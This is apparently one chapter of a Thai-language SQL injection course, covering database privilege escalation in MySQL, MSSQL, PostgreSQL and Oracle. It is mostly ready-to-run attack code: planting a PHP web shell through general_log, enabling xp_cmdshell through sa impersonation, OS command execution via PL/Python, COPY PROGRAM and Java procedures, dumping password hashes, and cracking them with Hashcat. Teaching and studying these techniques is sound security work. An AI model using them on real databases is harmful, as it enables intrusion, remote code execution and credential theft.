# Part 031: Database Privilege Escalation

## ภาพรวม

หลังจาก SQL Injection สำเร็จ ขั้นตอนถัดไปคือการยกระดับสิทธิ์ใน database เพื่อเข้าถึงข้อมูลและระบบมากขึ้น

**ขั้นตอนที่ 436-455**

---

## 436. สิทธิ์ใน Database

```sql
-- MySQL Privileges
SELECT, INSERT, UPDATE, DELETE  -- DML
CREATE, DROP, ALTER              -- DDL
GRANT OPTION                     -- ให้สิทธิ์คนอื่นได้
FILE                             -- อ่าน/เขียนไฟล์
SUPER                            -- superuser operations
EXECUTE                          -- stored procedures/functions

-- MSSQL Roles
SYSADMIN    -- ทำได้ทุกอย่าง
SECURITYADMIN -- จัดการ logins/permissions
DATABASECREATOR -- สร้าง databases
BULKADMIN   -- BULK INSERT operations
DB_OWNER    -- ควบคุม database ทั้งหมด
DB_DATAREADER -- อ่านได้ทั้งหมด
DB_DATAWRITER -- เขียนได้ทั้งหมด
```

---

## 437. MySQL Privilege Escalation

```sql
-- ตรวจสอบ privileges ปัจจุบัน
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER();
SELECT * FROM mysql.user WHERE user=user()\G

-- ตรวจสอบ FILE privilege
SELECT file_priv FROM mysql.user WHERE user=user();

-- ตรวจสอบ GRANT option
SELECT Grant_priv FROM mysql.user WHERE user=user();

-- ถ้ามี GRANT privilege:
GRANT ALL PRIVILEGES ON *.* TO current_user();
GRANT FILE ON *.* TO current_user();

-- ถ้ามี SUPER privilege:
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>';
SET GLOBAL general_log = 'OFF';
```

---

## 438. MSSQL Privilege Escalation

```sql
-- ตรวจสอบ roles
SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
SELECT IS_SRVROLEMEMBER('db_owner') AS is_db_owner;
SELECT IS_MEMBER('db_owner') AS is_db_owner_member;

-- ดู users ที่ impersonate ได้
SELECT l.name AS login_name, p.name AS principal_name
FROM sys.server_permissions sp
JOIN sys.server_principals l ON sp.grantee_principal_id = l.principal_id
JOIN sys.server_principals p ON sp.grantor_principal_id = p.principal_id
WHERE sp.permission_name = 'IMPERSONATE';

-- Impersonate sa
EXECUTE AS LOGIN='sa';
SELECT IS_SRVROLEMEMBER('sysadmin'); -- 1

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

REVERT; -- คืน session
```

---

## 439. PostgreSQL Privilege Escalation

```sql
-- ตรวจสอบ roles
SELECT current_user;
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb 
FROM pg_roles WHERE rolname=current_user;

-- ถ้ามี superuser:
CREATE EXTENSION plpythonu;
CREATE OR REPLACE FUNCTION exec(c text) RETURNS text AS $$
import subprocess
return subprocess.check_output(c, shell=True).decode()
$$ LANGUAGE plpythonu;
SELECT exec('id');

-- COPY command (ต้องการ SUPERUSER หรือ pg_read_server_files)
CREATE TABLE tmp (d text);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;

-- ตรวจสอบ COPY permission
SELECT has_table_privilege(current_user, 'information_schema.tables', 'SELECT');
```

---

## 440. Oracle Privilege Escalation

```sql
-- ตรวจสอบ privileges
SELECT * FROM user_sys_privs;
SELECT * FROM user_role_privs;
SELECT * FROM session_privs;

-- ดู DBA roles
SELECT grantee, granted_role FROM dba_role_privs WHERE grantee = USER;

-- Java Stored Procedures (ถ้ามี privilege)
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "Exec" AS
import java.lang.*;
import java.io.*;
public class Exec {
  public static String run(String cmd) throws Exception {
    Runtime rt = Runtime.getRuntime();
    String[] commands = {"/bin/sh", "-c", cmd};
    Process proc = rt.exec(commands);
    BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    StringBuffer sb = new StringBuffer();
    String line;
    while ((line = br.readLine()) != null) sb.append(line);
    return sb.toString();
  }
};
/

CREATE OR REPLACE FUNCTION exec_cmd(cmd VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'Exec.run(java.lang.String) return java.lang.String';
/

SELECT exec_cmd('id') FROM dual;
```

---

## 441. Credential Extraction

```sql
-- MySQL credentials
SELECT user, authentication_string FROM mysql.user;
SELECT user, password FROM mysql.user; -- older versions

-- MSSQL credentials  
SELECT name, password_hash FROM sys.sql_logins;

-- PostgreSQL credentials
SELECT usename, passwd FROM pg_shadow;
SELECT rolname, rolpassword FROM pg_authid;

-- Oracle credentials
SELECT username, password FROM dba_users; -- older
SELECT username, PASSWORD_VERSIONS FROM dba_users; -- newer
```

---

## 442. Password Cracking

```bash
# MySQL (sha1 hash)
echo -n 'password' | sha1sum | tr 'a-z' 'A-Z'
# MySQL stores as *HASH (prefix with *)

# John the Ripper
echo "user:*HASH" > mysql_hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=mysql-sha1 mysql_hashes.txt

# Hashcat
hashcat -m 300 hash.txt rockyou.txt
# -m 300 = MySQL4.1/MySQL5+

# PostgreSQL (md5 based)
echo "user:md5HASH" > pg_hashes.txt
hashcat -m 11700 pg_hashes.txt rockyou.txt

# MSSQL
hashcat -m 1731 mssql_hashes.txt rockyou.txt
```

---

## สรุป

Database Privilege Escalation:
- **MySQL** - SUPER, FILE, GRANT privileges
- **MSSQL** - sysadmin role, IMPERSONATE, xp_cmdshell
- **PostgreSQL** - superuser, COPY PROGRAM, PL/Python
- **Oracle** - Java stored procedures, DBA role
- **Passwords** - crack ด้วย John/Hashcat

---

*Part 031 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
